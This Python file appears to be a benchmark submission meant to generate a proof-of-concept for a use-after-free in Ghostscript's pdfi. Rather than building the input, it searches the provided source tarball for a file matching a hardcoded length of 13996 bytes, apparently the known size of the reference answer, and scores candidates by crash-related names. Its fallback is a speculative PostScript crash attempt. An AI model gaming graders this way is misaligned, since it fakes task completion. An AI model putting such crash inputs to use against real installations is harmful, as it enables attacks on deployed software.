import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        ground_len = 13996
        keywords = [
            "poc",
            "crash",
            "heap-use-after-free",
            "use-after-free",
            "uaf",
            "42280",
            "arvo",
            "bug",
            "testcase",
            "oss-fuzz",
            "clusterfuzz",
            "pdf",
            "ps",
            "regress",
        ]

        try:
            with tarfile.open(src_path, "r:*") as tf:
                best_member = None
                best_score = float("-inf")
                exact_matches = []

                for member in tf:
                    try:
                        is_file = member.isreg()
                    except Exception:
                        is_file = member.isfile()
                    if not is_file:
                        continue

                    size = getattr(member, "size", 0)
                    if not isinstance(size, int):
                        continue
                    if size <= 0:
                        continue
                    if size > 1048576:  # skip files >1MB
                        continue

                    name_lower = member.name.lower()
                    ext = os.path.splitext(name_lower)[1]

                    if size == ground_len:
                        exact_matches.append(member)

                    size_sim = max(
                        0.0, 1.0 - abs(size - ground_len) / float(ground_len)
                    )
                    score = size_sim * 50.0

                    if ext in (".pdf", ".ps"):
                        score += 40.0

                    for kw in keywords:
                        if kw in name_lower:
                            score += 10.0

                    if score > best_score:
                        best_score = score
                        best_member = member

                selected = None

                if exact_matches:
                    best_exact = None
                    best_exact_score = float("-inf")
                    for member in exact_matches:
                        name_lower = member.name.lower()
                        ext = os.path.splitext(name_lower)[1]
                        score = 0.0
                        if ext in (".pdf", ".ps"):
                            score += 40.0
                        for kw in keywords:
                            if kw in name_lower:
                                score += 10.0
                        if score > best_exact_score:
                            best_exact_score = score
                            best_exact = member
                    if best_exact is not None:
                        selected = best_exact

                if (
                    selected is None
                    and best_member is not None
                    and best_score > 0.0
                ):
                    selected = best_member

                if selected is not None:
                    try:
                        f = tf.extractfile(selected)
                        if f is not None:
                            try:
                                data = f.read()
                            finally:
                                f.close()
                            if data:
                                return data
                    except Exception:
                        pass
        except Exception:
            pass

        return self._default_poc()

    def _default_poc(self) -> bytes:
        poc_lines = [
            "%!PS-Adobe-3.0",
            "%%Title: pdfi use-after-free fallback PoC",
            "%%Creator: auto-generated",
            "%%Pages: 1",
            "%%EndComments",
            "/failpdfi {",
            "  % Attempt to create a broken pdfi context",
            "  /pdfdict where { pop } { /pdfdict 10 dict def } ifelse",
            "  pdfdict begin",
            "    /InputFile null def",
            "    % Simulate failure when setting the input stream",
            "    (%nonexistent_pdf_file%) (r) file /PDFSource exch def",
            "  end",
            "  % Now try to use PDF-related operators on the bad context",
            "  { .pdfopen } stopped pop",
            "  { .pdfpagecount } stopped pop",
            "  { .pdfclose } stopped pop",
            "} bind def",
            "failpdfi",
            "showpage",
            "",
        ]
        return ("\n".join(poc_lines)).encode("ascii", "replace")
